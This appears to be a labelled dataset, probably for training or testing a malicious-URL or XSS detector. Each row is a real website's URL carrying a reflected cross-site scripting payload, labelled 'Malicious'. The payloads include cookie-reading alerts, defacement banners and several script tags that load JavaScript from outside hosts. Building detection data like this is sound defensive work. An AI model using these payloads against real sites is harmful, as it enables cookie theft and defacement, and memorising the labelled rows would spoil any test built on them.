http://www.untj.org/?c=12&amp;id=&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower%20-%20from%20turkey/)%3b&lt;<br>/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;&lt;/marquee,Malicious
http://www.artmedic.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoo<br>r&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://icsouthlondon.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.<br>org/)%3c/script%3e%3cp,Malicious
http://f.www1.xwjp.com/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.threadsgalore.com/shopping/shoperror.asp?msg=%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious
"http://hu.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://www.cliquojeux.com/boutique.php?quece=""><script>alert(1337)</script>&monde=53",Malicious
http://www.flib.jp/flipviewer/popupfv/40/nopdf/indexnie.php?opf=%22%3e%27%3e%3c%73%63%72%69%70%74%3e<br>%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%<br>33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%3<br>1%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;ver=gen,Malicious
http://2.tool.ms/snchange.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
https://www.eland.emirates.com/registerme/en/subscription.asp?p1=%22%3e'%3e%3cscript%20src=http://vu<br>ln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://minnesota.twins.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.kcts.org/search.asp?data=db&amp;adv='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarq<br>uee%3ewhitehat%20forever%3c/marque%3e&amp;page='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarq<br>uee%3ewhitehat%20forever%3c/marque%3e&amp;order='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmar<br>quee%3ewhitehat%20forever%3c/marque%3e&amp;txtsearch=,Malicious
http://www.linkcenneti.com/arama.php?kelime=%22%3e%3cscript+src%3dhttp%3a%2f%2fsinek.pandela.net%2fj<br>.js%3e%3c%2fscript%3e&amp;submit=ara+%bb,Malicious
http://www.mercadolibre.com.pe/peru/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.hostingnova.net/nova/hsignup.php?pt=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br>%3ch1%3eby%20st@rext%20kanka%20nas%fdls%fdn%3c/h1%3e&amp;plan=firsat,Malicious
http://search.dooyoo.de/search?term=totalschaden&quot;&gt;&lt;script&gt;alert(&quot;test test test -<br>totalschaden&quot;)&lt;/script&gt;&amp;x=0&amp;y=0&amp;rest=both,Malicious
http://www.centrotecniconline.it/galleria/login.asp?folder=videoproiettori&amp;n=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www1.caixa.gov.br/atendimento/canais_atendimento/agencia.asp?tipoparametro=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,Malicious
http://yedda.com/widgets/faq?tags=%2520travel%2520%253cscript%2520type%%27%22%3e%3c/title%3e%3cscrip<br>t%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.insecula.com/membre/compte.html?userpseudo=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.greenday.com/site/news.php?pagenum_newsitems=1&amp;totalrows_newsitems=1%3cscript%3ealert(/%2<br>01337%20/)%3c/script%3e,Malicious
http://rshadow.gods-online.info/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63<br>%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%<br>2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%3<br>1%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=<br>1,Malicious
http://blogg.idg.se/perhellqvist/entry.jsp?messid=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://cahfs.ucdavis.edu/show.php?id=700%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.legalaid.on.ca/en/search.asp?target=search%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.colt.net/de/ge;internal&amp;action=search.action?searchstring=%22%3e%3cscript%3ealert(1);%3c/<br>script%3e,Malicious
http://dropline.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://kidnews.president.go.kr/kidclub/member/login.php?lgnurl=%27%22--%3e%3c/style%3e%3c/script%3e%<br>3cscript%3ealert%28%27xss%27%29%3c/script%3e,Malicious
http://www.benchmark.fr/cgi/recherche/recherche.php?f_recherche=%22%3e%3cmarquee%3e%3ch1%3edefaced%2<br>0by%20ironzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://www.asiatrademe.com/classifieds/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.senato.it/ricerche/avanzata/nuova.ricerca;jsessionid=300338248acd2059104a61355b2ba6f0?sea<br>rchid=&quot;&gt;''/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script<br>src=&quot;htpp://www.securitycode.it/x.js&quot;&gt;&lt;/script&gt;,Malicious
http://www.fms.treas.gov/scripts/search/?ciuserparam1=%22%22%3e%3e%3c%3cimg%20%22%22%22%3e%3cscript%<br>3ealert(/xss/)%3c/script%3e&amp;qrytype=all&amp;cigroup=10&amp;ciscopeoption=i&amp;ciscope=/&amp;cifiletypeoption=i&amp;cifi<br>letype=&amp;cisort=rank&amp;page=1,Malicious
https://downloads.trymedia.com/create_account.php?aff=t_np_ga&amp;email_address=%22%3e%27%3e%3cscript%3e<br>alert%28string.fromcharcode%2866%2c121%2c32%2c107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c9<br>9%2c111%2c109%29%29%3c%2fscript%3e%0a&amp;newsletter=1&amp;submit=sign%20up,Malicious
http://www.agenciacordobaciencia.cba.gov.ar/buscar.asp?txtbuscar_1=%22%3e%3cscript%3ealert(/xss/);%3<br>c/script%3e,Malicious
http://www.gametrailers.com/e32k7.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74<br>%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%<br>31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%3<br>1%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.wordcentral.com/cgi-bin/student?secure%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c<br>/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.icc.cat/portal/jsp/search.jsp?page=1&amp;query=searc%27%22%3e%3c/title%3e%3cscript%3ealert(13<br>37)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eh,Malicious
http://service.govdelivery.com/service/document.html?code=%22%3e%3cscript+src=http://starext.by.ru/l<br>t.js%3e,Malicious
http://www.hotspringsfsbos.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://prohealthpharma.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=3&i1.y=11",Malicious
http://www.getfave.com/locations/search?q=uber0n&amp;near=%22%3e%27%3e%3ciframe%20src=javascript:alert(1<br>23)%3e,Malicious
"http://es.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.iranads.biz/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mimima.com/link.php?ref='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3<br>e,Malicious
http://www.mahsen.net/yemek_tarifleri/yemek.php?mode=kategori&amp;kategori=et%20yemekleri&amp;baslik=et%20ye<br>mekleri&lt;script&gt;alert(&quot;cyber_thief(turkey)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.remoteexecution.net/bin/index.php?q=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;q_<br>type=sx&amp;domain_name=remoteexecution.net&amp;token=wlwszu2slvokewjtop_tgqcsahueqhukhtdsxn4qahgdiaawivcgaz<br>gnuirwoanq5nrecq,Malicious
http://www.prater.at/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://noshame.blogia.com/admin.php?entrada=login&amp;errorusuario=&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;&lt;h1&gt;http://www.jccharry.com/&lt;/h1&gt;&amp;nomblog=noshame,Malicious
http://www.buffalonews.com/search/?term=\%22%2b%27%3e%2b%3c%2bfoob%2b%3e%3cscript%3ealert(%27xssed%2<br>7)%3c/script%3e&amp;numresults=10,Malicious
http://z0ne-h.net/proindir/ara.asp?ara=%3cscript%3ealert(%22sana%20tek%20g%fczel%20bi%20tavsiye%20go<br>oglede%20%e7ocuk%20oyunlar%fd%20yaz%20%e7%fdkar%20oke%22)%3c/script%3e&amp;submit=+++ara+++,Malicious
http://nyats.com/dia/search.cgi?word='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%<br>3c/script%3e&amp;prm=and&amp;submit.x=0&amp;submit.y=0,Malicious
http://uk.ask.com/blogsearch?q=ss&t=n&s=r&bql=it%22/xados/%3e%3cscript%3ealert(document.cookie)%3c/script%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,Malicious
http://ddrn.dk/index.php?side_id=342&amp;show=54&amp;name=economic+management%22%3e%3cscript%3ealert(/ccc/)%<br>3c/script%3e,Malicious
http://www.frasi.net/autore.asp?autore=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e<br>%3ch1%3ebulurmusun%20bir%20ben%20daha%20!%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://old.brownsvilleherald.com/opinions.php?id=1180%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.kaytv.com.tr/giris.asp?kanal=anasayfa&amp;baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://lawebdelprogramador.com/codigo/buscar.php?buscar=ok&amp;id=13&amp;texto=c%2fvisual%2bc&amp;cadena=%3cscri<br>pt%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;x=18&amp;y=14,Malicious
http://www.bnzfs.org/imagegallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nidi.knaw.nl/en/links/search?query=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;startpos=%2f<br>en%2flinks,Malicious
http://www.marsflag.com/search.x?phrase=japan&amp;mode='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.j<br>s%3e%3c/script%3e,Malicious
"http://www.computerbild.de/cb/ekf/suchergebnis.html?cpdb_cid=""><script>alert(document.cookie)</script>",Malicious
"http://www.wave-internet.com/game/index.php?php_phaos_user=%22%3e%3cscript%3edocument.write%28string<br>.fromcharcode%2860,%20115,%2099,%20114,%20105,%20112,%20116,%2062,%20100,%20111,%2099,%20117,%20109,<br>%20101,%20110,%20116,%2046,%20103,%20101,%20116,%2069,%20108,%20101,%20109,%20101,%20110,%20116,%201<br>15,%2066,%20121,%2084,%2097,%20103,%2078,%2097,%20109,%20101,%2040,%2039,%20104,%20116,%20109,%20108<br>,%2039,%2041,%2091,%2048,%2093,%2046,%20105,%20110,%20110,%20101,%20114,%2072,%2084,%2077,%2076,%206<br>1,%2034,%2060,%2099,%20101,%20110,%20116,%20101,%20114,%2062,%2060,%20105,%20109,%20103,%2032,%20115<br>,%20114,%2099,%2061,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%20105,%2050,%2050,%2046,%20112,%2<br>0104,%20111,%20116,%20111,%2098,%20117,%2099,%20107,%20101,%20116,%2046,%2099,%20111,%20109,%2047,%2<br>097,%20108,%2098,%20117,%20109,%20115,%2047,%2098,%2051,%2052,%2054,%2047,%2097,%2052,%2050,%2057,%2<br>077,%20121,%2083,%20112,%2097,%2099,%20101,%2047,%2079,%20119,%20110,%20101,%20100,%2047,%20111,%201<br>19,%20110,%20101,%20100,%2045,%20115,%20104,%2097,%20114,%20107,%2046,%20106,%20112,%20103,%2062,%20<br>60,%2098,%20114,%2062,%2060,%20104,%2049,%2062,%2060,%20109,%2097,%20114,%20113,%20117,%20101,%20101<br>,%2062,%2072,%2097,%2099,%20107,%20101,%20100,%2032,%2066,%20121,%2032,%2077,%20117,%20116,%2097,%20<br>110,%20116,%2060,%2047,%20109,%2097,%20114,%20113,%20117,%20101,%20101,%2062,%2060,%2047,%20104,%204<br>9,%2062,%2060,%2047,%2099,%20101,%20110,%20116,%20101,%20114,%2062,%2034,%2060,%2047,%20115,%2099,%2<br>0114,%20105,%20112,%20116,%2062%29%29%3c/script%3e,%20112,%20116,%2062%29%29%3c/script%3e",Malicious
http://uni1.ogame.it/game/redir.php?url=http://%3c%22%3c%3cscript&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;/<br>/&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;&quot;&gt;/-/&gt;&lt;script&gt;alert(0)&lt;/script&gt;,Malicious
http://leverage-wiki.tnt.tv/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscript%3e,Malicious
http://bnf.net/ldap.cgi?asdfsemail=%22%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3cscript%3ealert%3cs<br>cript%3ealert(1337)%3c%2fscript%3e%3cscript%3ealert(1337)%3c%2fscript%3e(1337)%3cscript%3ealert(1337<br>)%3c%2fscript%3e%3c%2fscript%3e&amp;login=login&amp;enc40f915e0809bead798ad632cbca6392b=d15c1cf5a94856ed5f13<br>10b90c808216&amp;enc444aa218f07946c3=e7512721cdfdc7096ce6013d27b1153403635a3baa36ddca2fa27d2ff7981f6e,Malicious
http://ask.jp/item/index.asp?o=%22%3e'%3e%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.dancesport.ro/galerie/index.php?spgmgal=&lt;script&gt;alert(/xssed%20by%20dr.optix/)&lt;/script&gt;&amp;s<br>pgmpic=1&amp;spgmfilters=#pic,Malicious
http://www.europarl.de/view/de/quicklinks/contact.html?email=%22%3e%3ch1%3eding%20ding%20ding%20ding<br>%20ding%20ding%3c/h1%3e%3cimg%20src=//www.gamgea.com/wp-content/uploads/2010/06/retro-mario-in-3d-fl<br>avor.gif%3e,Malicious
http://www.m86security.com/support/search/sitesearch.asp?query=search...&product=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e&page=2,Malicious
http://ai.volpe.dot.gov/hhg/searchresults.asp?search=5&amp;ads=a'%3e%22%3e%3cscript/src=http://kusomiso.<br>com/xss.js%3e%3c/script%3e&amp;state=wa,Malicious
http://www.fepagro.rs.gov.br/index.php?acao=busca&amp;busca=%22%3e'%3e%3cscript%20src=http://vuln.xssed.<br>net/thirdparty/scripts/python5.js%3e%3c/script%3e&amp;submit=ok,Malicious
http://www.iariasrestaurant.com/igallery31/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.euro-share.com/archivesauthor.asp?author=%27edy+budiman+%3cedy_bd%40yahoo.com%3e%27%27%22<br>%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%<br>3c/h1%3e%3c/marquee%3e,Malicious
http://www.danielschwarzer.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.pnop.com/search?q=/""><script>alert('xss by atm0n3r')</script>",Malicious
http://www.carsibesiktas.com/forum/non_rte_javascript.asp?textarea=&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/s<br>cript&gt;,Malicious
http://www.alte.org/news/newsitem.php?newsid=209%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://wiki.freaks-unidos.net/weblogs/azul/firefox-ssh-tunnel%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ehttp://www.<br>componentsource.com/products/ipworks-ssh-net/summary.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337<br>)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.london.edu/search/search.html?qt=%22%3e%3cscript%3ealert(%2fkiller-tr%2f)%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious
http://identifiant.chez-alice.fr/info.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%3csc<br>ript%3ealert(document.cookie);%3c/script%3e,Malicious
http://tjphagan.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hideresetbtn<br>=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert('norehem%<br>20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e<br>%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/<br>upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.woespana.es/cgi-bin/suchen?lang=es&amp;ort=%3cscript%3ealert(/xss/)%28%29%3c%2fscript%3e,Malicious
http://search.kuaiche.com/index.php?k=%22%3e%3cmarquee%3edefaced%20by%20sponsfull%3c%2fmarquee%3e&amp;ti<br>d=1&amp;type=%e7%94%b5%e5%bd%b1&amp;submit=%e6%90%9c%e7%b4%a2,Malicious
http://www.jindir.com/search.php?q=%3clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel<br>=stylesheet%3e,Malicious
http://www.resourcesandtrust.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.monsieur-biographie.com/celebrite-absente/index.php?nom_de_la_celebrite=%3ciframe%20name=<br>''%20src='javascript:alert(1118)'%20scrolling='yes'%20height='220'%20width='180'%20frameborder='yes'<br>%3e%3c/iframe%3e%3cmarquee%3e%3ch1%3exss%20by%20zeryus%3c/h1%3e%3c/marquee%3e,Malicious
http://www.lg.co.kr/kosearch/lg_en/total_list.jsp?entrynm=total&amp;kwd=%22%3e%3cscript%3ealert(%22stuar<br>ty%22)%3c/script%3e&amp;select=select+region&amp;input.x=14&amp;input.y=9,Malicious
http://www.radioalbi.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://meetings.nigms.nih.gov/?id=3305%22%3e%3cscript%3ealert(1337)%3c/script%3e%22%3e%3cscript%3eal<br>ert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.milkandtwosugars.com/mats/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.vodafone.ro/mydomain/shop/voda.signup.cgi?pageid=index&amp;dname=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://posterazor.sourceforge.net/index.php?page=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e&amp;%3cscript%3ealert%28document.cookie%29%3c/script%3e=%3cscript%3ealert%28document.cookie%29%3c<br>/script%3e,Malicious
http://www.everyclick.com/uk/thevirginfoundationvirginunite/myeveryclick/search/?keyword=%22%3e%27%3<br>e%3c%2fscript%3e%3cscript%3ealert%28%27x%27%29%3c%2fscript%3e&amp;cookie=yes,Malicious
http://www.daniweb.com/search/search.php?q=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%<br>27,Malicious
http://pornnewcomer.sexseries.com/movies/041604/kelly/kelly.php?id=103519%27%22%3e%3c/title%3e%3cscr<br>ipt%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.tm.net.my/tmnet2006/contents/products-services/search.cfm?criteria=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;al<br>ert('=xssbydt=')%3b&lt;/script&gt;&amp;search_in=product&amp;submit=search,Malicious
http://webapp.iss.net/search.do?searchtype=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://suche.sueddeutsche.de/?source=sde&amp;radiosearch=archiv&amp;q=%3cscript%3ealert%28%22xss%22%29%3c%2f<br>script%3e&amp;x=17&amp;y=10,Malicious
http://rasthie.com/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
https://www.oberon-media.com/checkout/dualcheckout/checkout12.htm?code=111190330&amp;channel=110130270&amp;r<br>efid=1000&amp;orign=%22%27--%3e/%3e%3cscript%3ealert(-1)%3c/script%3e&amp;ln=fr&amp;billingcountry=%22%27--%3e/%<br>3e%3cscript%3ealert(-1)%3c/script%3e&amp;lc=fr&amp;gamecodedate=%22%27--%3e/%3e);%3c/script%3e%3cscript%3eal<br>ert(-1);%3c/script%3e,Malicious
http://mlb.mlb.com/mlb/sweepstakes/y2008/state_farm/callyourshot_sweeps.jsp?sf_ref=%22%3e%3cscript%3<br>ealert(document.cookie);%3c/script%3e&amp;partnerid=s00468,Malicious
http://dokumanlar.com/dosyaara.asp?islem=ara&amp;nerden=0&amp;kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.polizei-nrw.de/lka/suche/?page=2&amp;suchabfrage=polizei&amp;suchen=suchen&amp;all=asd&quot;&gt;&lt;script&gt;alert<br>(1337)&lt;/script&gt;&amp;dienststelle=,Malicious
http://www.stillwaterwrestling.com/pictures/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://abouttones.com/search.php?keyword=%22%3e%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.adultrader.com/detail.php?id=%22%3e'%3e%3c/script%3e%3cscript%3ealert('xss%20by%20kusomis<br>o.com')%3c/script%3e,Malicious
http://www.i3d.net/cup/clan-details.php?c=603'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;xss<br>%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://cgi.toshinari.net/support/test/search.cgi?keyword=&amp;start=1&amp;to=20&amp;bbs=%22%3e%27%3e%3cscript%3e<br>alert%28%22xss%22%29%3c%2fscript%3e,Malicious
http://www.n9.fr/index.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://portalavisos.com.ar/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.e-sehir.com/index.php?islem=il&amp;altislem=turizm&amp;il_kod=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://www.workingforhealthni.gov.uk/index/search.jsp/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22x<br>ss%22)%3c/script%3e,Malicious
http://www.anglertreff-online.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.goo.ne.jp/web.jsp?mt=xssed.com&amp;ie=euc-jp&amp;ot=&amp;at=&amp;et=&amp;bo=0&amp;domain=%22%3e%27%3e%3cscript<br>%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;ds=in&amp;ft=&amp;fth=in&amp;web.x=38&amp;web.y=2&amp;web=%a5%a6%a5%a7%a<br>5%d6,Malicious
http://www.yazilimindir.com/index.php?scm=1&amp;ara=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e,Malicious
http://www.justcufflinks.com/catalog_detail.cfm?sort=yes&amp;keyword=&amp;sortbyord=4&amp;sortbycat=32&amp;sortbyfea<br>t=0&amp;begin=1%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by<br>%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://webdealhosting.com/shared-hosting/domain-name/bulk-orders%7d%3c/st%22%3e%3c/iframe%3e%3cscrip<br>t%3ealert%28123%29%3c/script%3eyle%3e%3cscript%3ea=eval;b=alert;a%28b%28/xss/.source%29%29;%3c/scrip<br>t%3e%27%22%3e%3cmarquee%3e%3ch1%3ex%3c/h1%3e%3c/marquee%3e,Malicious
http://list.lelong.com.my/auc/list/list.asp?da=a&amp;thekeyword='&gt;&lt;body%20onload=alert(12307)&gt;&amp;categoryi<br>d=&amp;myauctiontype=1,Malicious
http://www.asahi.co.jp/cgi-bin/summersonic/stage.cgi?stage_no=open_air_stage&amp;open_day=13&amp;artist_name<br>='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.passion4science.com/member/profile_blogs_page.php?blog_profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdo<br>or&quot;)&lt;/script&gt;,Malicious
